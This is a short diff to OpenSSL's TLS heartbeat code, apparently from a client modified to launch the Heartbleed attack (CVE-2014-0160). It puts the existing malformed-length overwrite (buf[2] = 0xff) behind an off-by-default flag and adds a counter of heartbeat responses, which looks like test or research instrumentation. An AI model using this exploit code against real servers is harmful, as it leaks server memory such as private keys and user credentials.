@@ -115,9 +115,14 @@
 #include <openssl/hmac.h>
 #include <openssl/ocsp.h>
 #include <openssl/rand.h>
+#include <openssl/tls1.h>
 #include "ssl_locl.h"
 
 const char tls1_version_str[]="TLSv1" OPENSSL_VERSION_PTEXT;
+
+/* Activate heartbleed exploit (CVE-2014-0160)? */
+int heartbleed_activated = 0;
+int num_heartbeat_responses = 0;
 
 #ifndef OPENSSL_NO_TLSEXT
 static int tls_decrypt_ticket(SSL *s, const unsigned char *tick, int ticklen,
@@ -2614,6 +2619,8 @@ tls1_process_heartbeat(SSL *s)
 			s->tlsext_hb_seq++;
 			s->tlsext_hb_pending = 0;
 			}
+
+		num_heartbeat_responses++;
 		}
 
 	return 0;
@@ -2677,7 +2684,8 @@ tls1_heartbeat(SSL *s)
 	/* Random padding */
 	RAND_pseudo_bytes(p, padding);
 	/* Heartbleed attack (always request 255 bytes) */
-	buf[2] = 0xff;
+	if (heartbleed_activated)
+	  buf[2] = 0xff;
 
 	ret = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buf, 3 + payload + padding);
 	if (ret >= 0)
